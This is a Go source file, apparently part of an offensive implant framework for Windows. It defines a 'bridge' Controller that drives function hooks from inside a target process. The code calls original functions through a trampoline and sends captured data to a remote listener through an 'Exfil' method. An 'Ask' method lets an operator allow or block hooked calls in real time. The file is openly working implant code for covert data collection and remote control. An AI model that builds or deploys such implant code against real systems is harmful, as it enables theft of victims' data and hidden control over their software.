//go:build windows

package bridge

import (
	"fmt"
	"io"
	"syscall"
)

// Controller drives a hook handler from the implant side. Use Standalone for
// autonomous operation (no comms), Connect when the implant controls the hook
// in real time.
type Controller struct {
	conn       io.ReadWriteCloser
	argBlock   *ArgBlock
	standalone bool
}

// Standalone returns a Controller that operates autonomously without any
// outbound communication channel. All Ask calls return Allow.
func Standalone() *Controller {
	return &Controller{standalone: true}
}

// Connect returns a Controller backed by the given bidirectional channel.
// Call Close when done to release the connection.
func Connect(conn io.ReadWriteCloser) *Controller {
	return &Controller{conn: conn}
}

// SetArgBlock stores the captured arguments from the current hook invocation.
func (c *Controller) SetArgBlock(ab *ArgBlock) { c.argBlock = ab }

// Args returns the current ArgBlock, or an empty one if none was set.
func (c *Controller) Args() *ArgBlock {
	if c.argBlock == nil {
		return &ArgBlock{}
	}
	return c.argBlock
}

// CallOriginal invokes the trampoline with the given arguments and returns the
// result. Returns 0 if no trampoline address is available.
func (c *Controller) CallOriginal(args ...uintptr) uintptr {
	if c.argBlock == nil || c.argBlock.TrampolineAddr == 0 {
		return 0
	}
	r, _, _ := syscall.SyscallN(c.argBlock.TrampolineAddr, args...)
	return r
}

// SetReturn is a no-op stub; return-value patching is handled at the hook site.
func (c *Controller) SetReturn(_ uintptr) {}

// Log sends a free-form log message to the listener. Silently dropped in
// standalone mode.
func (c *Controller) Log(format string, a ...interface{}) {
	if c.standalone || c.conn == nil {
		return
	}
	writeFrame(c.conn, msgLog, []byte(fmt.Sprintf(format, a...))) //nolint:errcheck
}

// Exfil sends tagged binary data to the listener for collection. Silently
// dropped in standalone mode.
func (c *Controller) Exfil(tag string, data []byte) {
	if c.standalone || c.conn == nil {
		return
	}
	writeFrame(c.conn, msgExfil, append([]byte(tag+"\x00"), data...)) //nolint:errcheck
}

// Ask sends a tagged call event to the listener and waits for a Decision.
// Returns Allow on any transport error so the hook never blocks the target.
func (c *Controller) Ask(tag string, data []byte) Decision {
	if c.standalone || c.conn == nil {
		return Allow
	}
	if err := writeFrame(c.conn, msgCall, append([]byte(tag+"\x00"), data...)); err != nil {
		return Allow
	}
	msgType, resp, err := readFrame(c.conn)
	if err != nil || msgType != msgDecision || len(resp) < 1 {
		return Allow
	}
	return Decision(resp[0])
}

// Heartbeat sends a ping and waits for a matching pong. Returns an error if
// the listener does not respond correctly.
func (c *Controller) Heartbeat() error {
	if c.standalone || c.conn == nil {
		return nil
	}
	if err := writeFrame(c.conn, msgHeartbeat, nil); err != nil {
		return err
	}
	msgType, _, err := readFrame(c.conn)
	if err != nil {
		return err
	}
	if msgType != msgHeartbeat {
		return fmt.Errorf("expected heartbeat, got %d", msgType)
	}
	return nil
}

// Close releases the underlying connection.
func (c *Controller) Close() error {
	if c.conn == nil {
		return nil
	}
	return c.conn.Close()
}
